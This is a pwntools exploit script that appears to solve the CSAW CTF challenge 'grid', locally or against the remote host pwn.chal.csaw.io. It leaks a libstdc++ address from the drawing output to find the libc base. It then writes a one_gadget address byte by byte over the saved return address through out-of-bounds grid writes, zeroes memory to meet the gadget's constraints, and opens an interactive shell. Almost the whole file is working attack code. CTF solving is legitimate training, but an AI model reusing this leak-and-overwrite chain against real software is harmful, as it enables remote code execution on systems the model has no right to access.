#!/usr/bin/python2
from pwn import *
"""
struct A{
    char val;
    byte x;
    byte y;
    writes y +x*10
}
"""
local = False
if '-r' not in sys.argv:
    local = True
p = process(['./grid'], env = {'LD_PRELOAD': os.getcwd() + '/libc-2.27.so ' + os.getcwd() + '/libstdc.so.6.0.25'}) if local else remote('pwn.chal.csaw.io', 5013)
libc = ELF('./libc-2.27.so')
sla = lambda x,y: p.sendlineafter(x,y)
sa = lambda x,y: p.sendafter(x,y)
idx = 0x78
counter = 0
def send_draw(char_to_draw, x=1, y=1):
    global counter
    sla('shape> ', char_to_draw)
    if char_to_draw != 'd':
        sla('loc> ', str(x))
        p.sendline(str(y))
    counter = counter + 1
    print(counter)
def write_rop(value, base_idx):
    for i in xrange(6):
        send_draw(chr((value >> 8*i) & 0xff), base_idx/10, base_idx%10)
        base_idx += 1
    # send_draw(chr((one_gadget >> 24) & 0xff), idx/10, idx%10)
    # idx += 1
# gdb.attach(p, """
# b *0x400bb7""")
send_draw('d')
p.recvuntil('Displaying\n')
p.recv(10)
p.recv(7)
leak = p.recv(4)
p.recv(1)
leak += p.recv(4)
leak = u64(leak)
std_leak = leak - 0x3856e0
libc_base = std_leak + 0x389000
# log.info(hex(libc_base))
one_gadget = libc_base + 0x4f3c2
# print repr(hex(one_gadget))
pop_rdi = 0x0000000000400ee3
bin_sh = libc_base + 1786106 #libc.search('/bin/sh').next()
system_addr = libc_base + 324832 #libc.symbols['system']
ret_gadget = 0x00000000004008ae
send_draw(chr((one_gadget) & 0xff), 0x78/10, 0x78%10)
send_draw(chr(((one_gadget)>>8) & 0xff), 0x79/10, 0x79%10)
send_draw(chr(((one_gadget)>>16) & 0xff), 0x7a/10, 0x7a%10)
send_draw(chr(((one_gadget)>>24) & 0xff), 0x7b/10, 0x7b%10)
send_draw(chr(((one_gadget)>>32) & 0xff), 0x7c/10, 0x7c%10)
send_draw(chr(((one_gadget)>>40) & 0xff), 0x7d/10, 0x7d%10)
send_draw(chr(0x0), 0xc0/10, 0xc0%10)
send_draw(chr(0x0), 0xc1/10, 0xc1%10)
send_draw(chr(0x0), 0xc2/10, 0xc2%10)
send_draw(chr(0x0), 0xc3/10, 0xc3%10)
send_draw(chr(0x0), 0xc4/10, 0xc4%10)
send_draw(chr(0x0), 0xc5/10, 0xc5%10)
send_draw('d')
p.interactive()
